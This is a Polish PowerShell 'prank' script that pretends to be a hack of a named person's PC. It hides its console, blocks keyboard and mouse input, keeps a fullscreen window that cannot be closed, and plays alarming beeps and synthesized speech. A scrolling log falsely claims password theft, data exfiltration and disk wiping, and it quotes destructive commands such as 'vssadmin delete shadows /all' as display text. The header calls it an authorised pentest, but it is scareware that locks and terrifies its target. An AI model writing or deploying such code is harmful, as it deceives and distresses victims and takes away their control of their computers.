# ═══════════════════════════════════════════════════════════════════
# TYMUSHACKER v5.0 - MEGA KRWAWY PRANK
# Autoryzowany pentest - test bezpieczeństwa za zgodą właściciela
# ═══════════════════════════════════════════════════════════════════

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Speech

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
    [DllImport("user32.dll")]
    public static extern int ShowCursor(bool bShow);
    [DllImport("user32.dll")]
    public static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);
}
"@

# Ukryj konsolę natychmiast
$consolePtr = [Win32]::GetConsoleWindow()
[Win32]::ShowWindow($consolePtr, 0)

# Blokada myszy i klawiatury na 2 sekundy (żeby nie zdążył nic kliknąć)
try { [Win32]::BlockInput($true) } catch {}

# Ukryj kursor
[Win32]::ShowCursor(0) | Out-Null

# Syntezator mowy
$speech = New-Object System.Speech.Synthesis.SpeechSynthesizer
$speech.Rate = -8
$speech.Volume = 100
try { $speech.SelectVoice($speech.GetInstalledVoices()[0].VoiceInfo.Name) } catch {}

# GŁÓWNE OKNO
$form = New-Object System.Windows.Forms.Form
$form.Text = "SYS_CRASH - KERNEL PANIC"
$form.WindowState = "Maximized"
$form.FormBorderStyle = "None"
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::FromArgb(40, 0, 0)
$form.ShowInTaskbar = $false
$form.ControlBox = $false
$form.KeyPreview = $true
$form.Cursor = [System.Windows.Forms.Cursors]::No

# TOTALNA blokada klawiatury
$form.KeyDown += { param($s,$e) $e.SuppressKeyPress=$true; $e.Handled=$true }
$form.KeyUp += { param($s,$e) $e.SuppressKeyPress=$true; $e.Handled=$true }

# Timer utrzymujący na wierzchu i blokujący wszystko
$lockTimer = New-Object System.Windows.Forms.Timer
$lockTimer.Interval = 30
$lockTimer.Add_Tick({
    $form.TopMost = $true
    $form.WindowState = "Maximized"
    $form.Focus() | Out-Null
    try { [Win32]::SetForegroundWindow($form.Handle) } catch {}
    try { [Win32]::BlockInput($true) } catch {}
    try { [Win32]::ShowCursor(0) } catch {}
})
$lockTimer.Start()

# ====== KRWAWE ASCII ======
$skullArt = @"

                                        ╔══════════════════════════════════════════════════╗
                                        ║                                                  ║
                                        ║     ▓█████▄ ▓█████ ▓█████▄ ▓█████▓█████▓█████   ║
                                        ║     ▒██▀ ██▌▓█   ▀ ▒██▀ ██▌▓█   ▀▓█   ▀▓█   ▀   ║
                                        ║     ░██   █▌▒███   ░██   █▌▒███  ▒███  ▒███     ║
                                        ║     ░▓█▄   ▌▒▓█  ▄ ░▓█▄   ▌▒▓█  ▄▒▓█  ▄▒▓█  ▄   ║
                                        ║     ░▒████▓ ░▒████▒░▒████▓ ░▒████▒░▒████▒░▒████▒  ║
                                        ║      ▒▒▓  ▒ ░░ ▒░ ░ ▒▒▓  ▒ ░░ ▒░ ░░░ ▒░ ░░░ ▒░ ░  ║
                                        ║      ░ ▒  ▒  ░ ░  ░ ░ ▒  ▒  ░ ░  ░ ░ ░  ░ ░ ░  ░  ║
                                        ║      ░ ░  ░    ░    ░ ░  ░    ░      ░      ░     ║
                                        ║      ░       ░  ░   ░       ░  ░   ░  ░   ░  ░   ║
                                        ║      ░                                              ║
                                        ║                                                  ║
                                        ╚══════════════════════════════════════════════════╝

"@

# Główny banner - KRWAWY
$bannerSkull = New-Object System.Windows.Forms.Label
$bannerSkull.Text = @"

  ████████╗██╗   ██╗███╗   ███╗██╗   ██╗███████╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
  ╚══██╔══╝██║   ██║████╗ ████║██║   ██║██╔════╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
     ██║   ██║   ██║██╔████╔██║██║   ██║███████╗███████║███████║██║     █████╔╝ █████╗  ██████╔╝
     ██║   ██║   ██║██║╚██╔╝██║██║   ██║╚════██║██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
     ██║   ╚██████╔╝██║ ╚═╝ ██║╚██████╔╝███████║██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
     ╚═╝    ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

"@
$bannerSkull.Font = New-Object System.Drawing.Font("Consolas", 10, [System.Drawing.FontStyle]::Bold)
$bannerSkull.ForeColor = [System.Drawing.Color]::FromArgb(255, 0, 0)
$bannerSkull.BackColor = [System.Drawing.Color]::FromArgb(20, 0, 0)
$bannerSkull.TextAlign = "MiddleCenter"
$bannerSkull.Size = New-Object System.Drawing.Size(1500, 200)
$bannerSkull.Location = New-Object System.Drawing.Point(10, 5)
$form.Controls.Add($bannerSkull)

# NAPIS "CZESC MIKOLAJ" - wielki, krwawy
$helloLabel = New-Object System.Windows.Forms.Label
$helloLabel.Text = @"

████████████████████████████████████████████████████████████████████████████████████████████████████████████
██                                                                                                        ██
██    ██████╗███████╗███████╗ ██████╗     ███╗   ███╗██╗██╗  ██╗ ██████╗ ██╗      █████╗     ██╗         ██
██   ██╔════╝██╔════╝██╔════╝██╔════╝     ████╗ ████║██║██║ ██╔╝██╔═══██╗██║     ██╔══██╗    ██║         ██
██   ██║     █████╗  ███████╗██║          ██╔████╔██║██║█████╔╝ ██║   ██║██║     ███████║    ██║         ██
██   ██║     ██╔══╝  ╚════██║██║          ██║╚██╔╝██║██║██╔═██╗ ██║   ██║██║     ██╔══██║    ██║         ██
██   ╚██████╗███████╗███████║╚██████╗     ██║ ╚═╝ ██║██║██║  ██╗╚██████╔╝███████╗██║  ██║    ██║         ██
██    ╚═════╝╚══════╝╚══════╝ ╚═════╝     ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝         ██
██                                                                                                        ██
████████████████████████████████████████████████████████████████████████████████████████████████████████████

"@
$helloLabel.Font = New-Object System.Drawing.Font("Consolas", 9, [System.Drawing.FontStyle]::Bold)
$helloLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 0, 0)
$helloLabel.BackColor = [System.Drawing.Color]::FromArgb(20, 0, 0)
$helloLabel.TextAlign = "MiddleCenter"
$helloLabel.Size = New-Object System.Drawing.Size(1500, 150)
$helloLabel.Location = New-Object System.Drawing.Point(10, 200)
$form.Controls.Add($helloLabel)

# Status bar
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "███ INICJOWANIE PROTOKOŁU PRZEJĘCIA ███"
$statusLabel.Font = New-Object System.Drawing.Font("Consolas", 18, [System.Drawing.FontStyle]::Bold)
$statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 50, 0)
$statusLabel.BackColor = [System.Drawing.Color]::FromArgb(10, 0, 0)
$statusLabel.TextAlign = "MiddleCenter"
$statusLabel.Size = New-Object System.Drawing.Size(1400, 50)
$statusLabel.Location = New-Object System.Drawing.Point(50, 355)
$form.Controls.Add($statusLabel)

# Progress bar - krwawy
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Size = New-Object System.Drawing.Size(1200, 35)
$progressBar.Location = New-Object System.Drawing.Point(150, 410)
$progressBar.Style = "Continuous"
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(255, 0, 0)
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(30, 0, 0)
$form.Controls.Add($progressBar)

# Logi
$logBox = New-Object System.Windows.Forms.ListBox
$logBox.Size = New-Object System.Drawing.Size(1400, 350)
$logBox.Location = New-Object System.Drawing.Point(50, 460)
$logBox.BackColor = [System.Drawing.Color]::FromArgb(10, 0, 0)
$logBox.ForeColor = [System.Drawing.Color]::FromArgb(200, 0, 0)
$logBox.Font = New-Object System.Drawing.Font("Consolas", 10, [System.Drawing.FontStyle]::Bold)
$logBox.BorderStyle = "None"
$form.Controls.Add($logBox)

# Timer główny
$mainTimer = New-Object System.Windows.Forms.Timer
$mainTimer.Interval = 100
$step = 0

$messages = @(
    "INICJOWANIE ZDALNEGO DOSTĘPU... [IP: 91.234.55.128:4443]",
    "SKANOWANIE PORTÓW: 135/TCP OTWARTY | 445/TCP OTWARTY | 3389/TCP OTWARTY",
    "WYKRYTO SYSTEM: WINDOWS 11 PRO (BUILD 22631) - HOST: MIKOLAJ-PC",
    "EKSTRAKCJA HASHY NTLM z PROCESU LSASS.EXE...",
    "PRZEPROWADZANIE ATAKU PASS-THE-HASH... [HASH: aad3b435b51404eeaad3b435b51404ee]",
    "AUTORYZACJA POWIODŁA SIĘ - DOSTĘP ADMINISTRATOR: NT AUTHORITY\SYSTEM",
    "PRZEŁAMYWANIE ZAPORY WINDOWS DEFENDER... [BYPASS]",
    "WSTRZYKIWANIE KODU DO PROCESU: svchost.exe [PID: 4284]",
    "POBIERANIE DANYCH Z PRZEGLĄDAREK...",
    "DEKODOWANIE HASEŁ Z CHROME [ZNAJDZIONO: 47 HASEŁ]",
    "DEKODOWANIE HASEŁ Z FIREFOX [ZNAJDZIONO: 23 HASŁA]",
    "DEKODOWANIE HASEŁ Z EDGE [ZNAJDZIONO: 31 HASEŁ]",
    "EKSTRAKCJA COOKIES I TOKENÓW SESJI... [WYSYŁANIE...]",
    "SKANOWANIE DYSKU C:\ W POSZUKIWANIU DOKUMENTÓW...",
    "ZNAJDOWANIE: 1,457 PLIKÓW .PDF | 923 .DOCX | 312 .XLSX | 89 .ZIP",
    "KOMPRESJA DANYCH DO ARCHIWUM: sensitive_data_mikolaj.7z",
    "WYSYŁANIE DANYCH NA SERWER FTP: 185.234.72.19:21 [100%]",
    "INSTALOWANIE BACKDOORA... [PERSISTENCE: HKLM\...\Run]",
    "PRZEJMOWANIE KONTROLI NAD KAMERĄ WEBCAM... [AKTYWNA]",
    "USUWANIE VOLUME SHADOW COPIES (VSS)... [vssadmin delete shadows /all]",
    "WYŁĄCZANIE WINDOWS DEFENDER... [REGEDIT: DisableAntiSpyware = 1]",
    "BLOKOWANIE TRYB AWARII... [bcdedit /set {default} recoveryenabled No]",
    "USUWANIE PUNKTÓW PRZYWRACANIA SYSTEMU...",
    "NISZCZENIE REJESTRU BOOTOWEGO MBR... [mbr.bin - OVERWRITE]",
    "FORMATOWANIE DYSKU C:\ ░░░░░░░░░░ 0%",
    "FORMATOWANIE DYSKU C:\ ████░░░░░░ 18%",
    "FORMATOWANIE DYSKU C:\ ████████░░ 36%",
    "FORMATOWANIE DYSKU C:\ ██████████ 50%",
    "FORMATOWANIE DYSKU C:\ ████████████░░ 64%",
    "FORMATOWANIE DYSKU C:\ ██████████████░░ 78%",
    "FORMATOWANIE DYSKU C:\ ████████████████ 92%",
    "FORMATOWANIE DYSKU C:\ ████████████████ 100% - ZAKOŃCZONO",
    "USUWANIE SYSTEM32... ░░░░░ 0%",
    "USUWANIE SYSTEM32... ████░ 33%",
    "USUWANIE SYSTEM32... ██████ 66%",
    "USUWANIE SYSTEM32... ████████ 100% - ZAKOŃCZONO",
    "NISZCZENIE TABELI PARTYCJI... [GPT HEADER - CORRUPTED]",
    "NISZCZENIE STRUKTURY DANYCH... [MFT - CORRUPTED]",
    "💀💀💀 ZAKOŃCZONO - SYSTEM ZNISZCZONY W 100% 💀💀💀"
)

# Uruchom straszny dźwięk w tle
$audioJob = [PowerShell]::Create()
[void]$audioJob.AddScript({
    param($dur)
    $end = [DateTime]::Now.AddMilliseconds($dur)
    $r = New-Object System.Random
    while ([DateTime]::Now -lt $end) {
        try {
            $freq = $r.Next(50, 2000)
            $len = $r.Next(30, 200)
            [Console]::Beep($freq, $len)
            Start-Sleep -Milliseconds $r.Next(20, 80)
        } catch {}
    }
})
[void]$audioJob.AddParameter("dur", 120000)
[void]$audioJob.BeginInvoke()

# Mowa
$speech.SpeakAsync("CZĘŚĆ MIKOŁAJ. PRZEJMUJĘ KONTROLĘ NAD TWOIM SYSTEMEM. WSZYSTKIE TWOJE DANE ZOSTANĄ USUNIĘTE. NIE MA ODWROTU.") | Out-Null

$mainTimer.Add_Tick({
    $step++
    if ($step -le $messages.Count) {
        $statusLabel.Text = "███ [$step/$($messages.Count)] $($messages[$step-1]) ███"
        $progressBar.Value = [math]::Min(100, [math]::Ceiling(($step / $messages.Count) * 100))
        $logBox.Items.Insert(0, "[⚠] $($messages[$step-1])")
        if ($logBox.Items.Count -gt 40) { $logBox.Items.RemoveAt($logBox.Items.Count-1) }
        
        # Efekt migania kolorów - losowe odcienie czerwieni
        $r = Get-Random -Min 150 -Max 255
        $g = Get-Random -Min 0 -Max 30
        $b = Get-Random -Min 0 -Max 10
        $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb($r, $g, $b)
        
        # Okazjonalne przerażające beepy
        if ($step % 5 -eq 0) {
            try { [Console]::Beep((Get-Random -Min 100 -Max 800), 150) } catch {}
        }
        
        # Co 10 kroków - mowa
        if ($step % 10 -eq 0) {
            $phrases = @(
                "NIE PRÓBUJ TEGO ZAMKNĄĆ, MIKOŁAJ.",
                "TWOJE DANE SĄ JUŻ BEZPOWROTNIE USUNIĘTE.",
                "TO JUŻ KONIEC. SYSTEM JEST MÓJ.",
                "NIE MA RATUNKU DLA TWOJEGO KOMPUTERA.",
                "WSZYSTKO ZOSTAŁO SKOPIOWANE I USUNIĘTE."
            )
            $speech.SpeakAsync($phrases[(Get-Random -Max $phrases.Length)]) | Out-Null
        }
    }
    
    if ($step -eq $messages.Count) {
        $mainTimer.Stop()
        $audioJob.Dispose()
        
        # CZYŚCIMY WSZYSTKO - EKRAN ŚMIERCI
        $form.Controls.Clear()
        $form.BackColor = [System.Drawing.Color]::FromArgb(60, 0, 0)
        
        # Wielki KRWAWY napis
        $deathArt = @"

            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
            ░░                                                                              ░░
            ░░   ████████╗██╗  ██╗███████╗     ███████╗███╗   ██╗██████╗                  ░░
            ░░   ╚══██╔══╝██║  ██║██╔════╝     ██╔════╝████╗  ██║██╔══██╗                 ░░
            ░░      ██║   ███████║█████╗       █████╗  ██╔██╗ ██║██║  ██║                 ░░
            ░░      ██║   ██╔══██║██╔══╝       ██╔══╝  ██║╚██╗██║██║  ██║                 ░░
            ░░      ██║   ██║  ██║███████╗     ███████╗██║ ╚████║██████╔╝                 ░░
            ░░      ╚═╝   ╚═╝  ╚═╝╚══════╝     ╚══════╝╚═╝  ╚═══╝╚═════╝                  ░░
            ░░                                                                              ░░
            ░░   ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗                    ░░
            ░░   ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║                    ░░
            ░░   █████╗   ╚████╔╝ █████╗     ██║   █████╗  ██╔████╔██║                    ░░
            ░░   ██╔══╝    ╚██╔╝  ██╔══╝     ██║   ██╔══╝  ██║╚██╔╝██║                    ░░
            ░░   ███████╗   ██║   ███████╗   ██║   ███████╗██║ ╚═╝ ██║                    ░░
            ░░   ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝                    ░░
            ░░                                                                              ░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░


  ░██████╗██╗░░░██╗░██████╗████████╗███████╗███╗░░░███╗██╗░░░██╗███████╗██╗░░░░░███████╗████████╗
  ██╔════╝╚██╗░██╔╝██╔════╝╚══██╔══╝██╔════╝████╗░████║██║░░░██║██╔════╝██║░░░░░██╔════╝╚══██╔══╝
  ╚█████╗░░╚████╔╝░╚█████╗░░░░██║░░░█████╗░░██╔████╔██║██║░░░██║█████╗░░██║░░░░░█████╗░░░░░██║░░░
  ░╚═══██╗░░╚██╔╝░░░╚═══██╗░░░██║░░░██╔══╝░░██║╚██╔╝██║██║░░░██║██╔══╝░░██║░░░░░██╔══╝░░░░░██║░░░
  ██████╔╝░░░██║░░░██████╔╝░░░██║░░░███████╗██║░╚═╝░██║╚██████╔╝███████╗███████╗███████╗░░░██║░░░
  ╚═════╝░░░░╚═╝░░░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░░░░╚═╝░╚═════╝░╚══════╝╚══════╝╚══════╝░░░╚═╝░░░


  ╔══════════════════════════════════════════════════════════════════════════════════════╗
  ║                                                                                      ║
  ║                     ✦  CZEŚĆ MIKOŁAJ! ✦                                             ║
  ║                                                                                      ║
  ║     TWOJ SYSTEM ZOSTAŁ CAŁKOWICIE PRZEJĘTY PRZEZ TYMUSHACKER v5.0                   ║
  ║                                                                                      ║
  ║     ✓  WSZYSTKIE DANE ZOSTAŁY SKOPIOWANE I USUNIĘTE                                ║
  ║     ✓  SYSTEM OPERACYJNY JEST NIEODWRACALNIE USZKODZONY                             ║
  ║     ✓  WSZYSTKIE KONTA ZOSTAŁY SKOMPROMITOWANE                                     ║
  ║     ✓  HASŁA, COOKIES, SESJE - WSZYSTKO WYCIEKŁO                                   ║
  ║     ✓  NIE MA MOŻLIWOŚCI ODZYSKANIA DANYCH                                         ║
  ║     ✓  NIE MA MOŻLIWOŚCI ODZYSKANIA SYSTEMU                                        ║
  ║     ✓  NIE MA WYJŚCIA Z TEGO EKRANU                                                ║
  ║                                                                                      ║
  ║                                                                                      ║
  ║     █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█              ║
  ║     ░  Alt+F4 ................... ZABLOKOWANE                    ░              ║
  ║     ░  Escape ................... ZABLOKOWANE                    ░              ║
  ║     ░  Ctrl+Alt+Del ............. ZABLOKOWANE                    ░              ║
  ║     ░  Przycisk Windows ......... ZABLOKOWANE                    ░              ║
  ║     ░  Task Manager ............. NIEDOSTĘPNY                    ░              ║
  ║     ░  Kursor myszy ............. ZABLOKOWANY                    ░              ║
  ║     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█              ║
  ║                                                                                      ║
  ║     JEDYNE WYJŚCIE:                                                                    ║
  ║     →  WYŁĄCZ KOMPUTER PRZYCISKIEM POWER                                           ║
  ║     →  ODŁĄCZ KABEL ZASILANIA (JEŚLI TO LAPTOP - WYCIĄGNIJ BATERIĘ)               ║
  ║     →  WŁĄCZ PONOWNIE                                                                ║
  ║     →  ...ALE TWOJE DANE SĄ JUŻ BEZPOWROTNIE UTRACONE                               ║
  ║                                                                                      ║
  ╚══════════════════════════════════════════════════════════════════════════════════════╝

"@

        $deathLabel = New-Object System.Windows.Forms.Label
        $deathLabel.Text = $deathArt
        $deathLabel.Font = New-Object System.Drawing.Font("Consolas", 9, [System.Drawing.FontStyle]::Bold)
        $deathLabel.ForeColor = [System.Drawing.Color]::FromArgb(220, 0, 0)
        $deathLabel.BackColor = [System.Drawing.Color]::FromArgb(20, 0, 0)
        $deathLabel.TextAlign = "MiddleCenter"
        $deathLabel.Size = New-Object System.Drawing.Size(1550, 800)
        $deathLabel.Location = New-Object System.Drawing.Point(5, 10)
        $form.Controls.Add($deathLabel)
        
        # Migający napis - krwawy
        $blinkLabel = New-Object System.Windows.Forms.Label
        $blinkLabel.Text = "💀💀💀 SYSTEM ZAHAKOWANY PRZEZ TYMUSHACKER - DANE USUNIĘTE - WYŁĄCZ KOMPUTER 💀💀💀"
        $blinkLabel.Font = New-Object System.Drawing.Font("Consolas", 16, [System.Drawing.FontStyle]::Bold)
        $blinkLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 0, 0)
        $blinkLabel.BackColor = [System.Drawing.Color]::FromArgb(10, 0, 0)
        $blinkLabel.TextAlign = "MiddleCenter"
        $blinkLabel.Size = New-Object System.Drawing.Size(1550, 50)
        $blinkLabel.Location = New-Object System.Drawing.Point(5, 820)
        $form.Controls.Add($blinkLabel)
        
        # Timer migania
        $blinkTimer = New-Object System.Windows.Forms.Timer
        $blinkTimer.Interval = 350
        $blinkTimer.Add_Tick({
            if ($blinkLabel.ForeColor.R -gt 100) {
                $blinkLabel.ForeColor = [System.Drawing.Color]::FromArgb(60, 0, 0)
                $blinkLabel.BackColor = [System.Drawing.Color]::FromArgb(5, 0, 0)
            } else {
                $blinkLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 0, 0)
                $blinkLabel.BackColor = [System.Drawing.Color]::FromArgb(20, 0, 0)
            }
            $form.TopMost = $true
            $form.Activate() | Out-Null
        })
        $blinkTimer.Start()
        
        # Straszny dźwięk drugi etap
        $audioJob2 = [PowerShell]::Create()
        [void]$audioJob2.AddScript({
            $end = [DateTime]::Now.AddMinutes(10)
            $r = New-Object System.Random
            while ([DateTime]::Now -lt $end) {
                try {
                    [Console]::Beep($r.Next(100, 1800), $r.Next(100, 400))
                    Start-Sleep -Milliseconds $r.Next(50, 150)
                } catch {}
            }
        })
        [void]$audioJob2.BeginInvoke()
        
        # Mowa końcowa
        $speech.SpeakAsync("KONIEC. SYSTEM ZNISZCZONY. WSZYSTKIE DANE UTRACONE. WYŁĄCZ KOMPUTER.") | Out-Null
    }
})

# Totalne blokady
$form.Add_FormClosing({
    param($s, $e)
    $e.Cancel = $true
})

$form.Add_Deactivate({
    $form.TopMost = $true
    $form.Activate() | Out-Null
})

$form.Add_Activated({
    try { [Win32]::BlockInput($true) } catch {}
    try { [Win32]::ShowCursor(0) } catch {}
})

# Odblokuj input po 2 sekundach (niech się boi)
Start-Sleep -Milliseconds 2000
try { [Win32]::BlockInput($false) } catch {}

[System.Windows.Forms.Application]::Run($form)
